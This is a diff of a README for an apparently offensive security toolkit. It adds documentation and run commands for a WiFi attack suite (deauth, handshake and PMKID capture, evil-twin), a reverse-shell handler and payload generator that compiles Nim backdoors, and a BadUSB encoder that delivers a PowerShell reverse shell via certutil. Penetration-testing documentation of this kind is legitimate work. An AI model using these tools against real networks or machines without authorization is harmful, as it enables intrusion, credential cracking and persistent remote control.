@@ -68,10 +68,13 @@ pip3 install requests beautifulsoup4 dnspython scapy psutil netifaces frida-tool
 | `ctfpwn` | `nmap`, `gobuster`, `sshpass`, `hydra`, `nodejs` | — |
 | `websec` | `ffuf`⁴, `gobuster`, `msfvenom` (for msf_payload), `tor` (optional) | `requests`, `beautifulsoup4`, `dnspython` |
 | `mac_spoof` | `iproute2` (pre-installed on most distros) | `psutil`, `netifaces` |
-| `wifi_monitor` | `nmap` | `scapy`, `psutil` |
+| `wifi_monitor` | `aircrack-ng`, `hostapd`, `dnsmasq`, `hcxdumptool`, `hcxtools`, `reaver`, `hashcat`, `bettercap` | `scapy` |
 | `adsec` | `nmap`, `smbclient`, `rpcclient` | `impacket`, `ldap3`, `dnspython` |
-| `winadsec` | `nmap`, `smbclient`, `rpcclient`, `nxc`, `kerbrute` | `impacket`, `ldap3`, `bloodhound` |
+| `winadsec` | `nmap`, `smbclient`, `rpcclient`, `nxc`, `kerbrute` | `impacket`, `ldap3`, `bloodhound`, `pyinstaller` (inject_exe) |
 | `ios_pentest` | `libimobiledevice`, `ideviceinstaller` | `requests` |
+| `iot_pwn` | — | `paramiko`, `requests` (optional) |
+| `revshell` | `nc` or `socat` (optional), `msfvenom` (optional), `nim` (nim_backdoor) | — |
+| `badusb` | — | — (stdlib only) |
 
 ¹ rustscan: `cargo install rustscan` — or grab a binary from [GitHub releases](https://github.com/RustScan/RustScan/releases)
 
@@ -516,14 +519,39 @@ run localhost
 
 ---
 
-### `wifi_monitor` — Smart WiFi Monitor
+### `wifi_monitor` — Full-Stack WiFi Attack Suite
 
-Real-time host discovery via ARP (scapy) with TCP-ping fallback, async per-host port scanning, device fingerprinting (IoT, router, NAS, database server), CVE lookup via CIRCL API, and threat detection for exposed databases, Telnet, FTP, and end-of-life SSH.
+23 modes covering wireless assessment end-to-end: passive scanning, WPA2 handshake capture, deauth, PMKID capture, WPS attacks, evil-twin rogue AP, ARP-spoofing MITM, hashcat cracking, and an OnlyShell reverse shell handler with optional captive-portal payload delivery.
 
 ```bash
 sudo secV
-use wifi_monitor
-run 192.168.1.0/24
+use wifi_monitor; set mode wifi_scan; set iface wlan0; run target
+
+# Capture WPA2 handshake
+use wifi_monitor; set mode capture; set iface wlan0; set bssid AA:BB:CC:DD:EE:FF; set channel 6; run target
+
+# PMKID → crack in one shot
+use wifi_monitor; set mode auto_crack; set iface wlan0; set bssid AA:BB:CC:DD:EE:FF; run target
+```
+
+---
+
+### `revshell` — Multi-Session Reverse Shell Handler
+
+Python port of [OnlyShell](https://github.com/malwarekid/OnlyShell): multi-session handler with shell/OS type detection, background sessions, command broadcasting, TLS support, and a 30+ one-liner payload generator. Also compiles Nim backdoors with auto-reconnect logic. Imported by every other module to provide `shell` operations.
+
+```bash
+# Interactive handler
+use revshell; set mode serve; set ports 4444; run target
+
+# Generate all payloads
+use revshell; set mode generate; set lhost 10.10.10.10; set shell all; run target
+
+# Compile Nim reverse shell binary
+use revshell; set mode nim_backdoor; set lhost 10.10.10.10; set target_os linux; run target
+
+# Quick CLI start
+python3 tools/network/revshell/revshell.py 4444
 ```
 
 ---
@@ -656,6 +684,29 @@ set operation bypass_403
 set bypass_path /admin
 run https://example.com
 ```
+
+---
+
+### `badusb` — BadUSB / Rubber Ducky Payload Encoder
+
+Encodes a PowerShell `.ps1` script as base64 and wraps it in DuckyScript. On execution the USB device opens Win+R → `powershell`, then uses `certutil` to decode and run the payload — no external tools needed on the attacker machine.
+
+```bash
+use badusb
+set file_path /tmp/rev.ps1
+run target
+
+# With custom metadata and longer delay for slow hardware
+use badusb
+set file_path /tmp/rev.ps1
+set title "Reverse Shell"
+set author "operator"
+set ducky_lang true
+set delay_after_ps 1200
+run target
+```
+
+Output saved to `~/.secv/badusb/<stem>_badusb.txt`. Compatible with USB Rubber Ducky, Hak5 devices, and any DuckyScript tool.
 
 ---
 
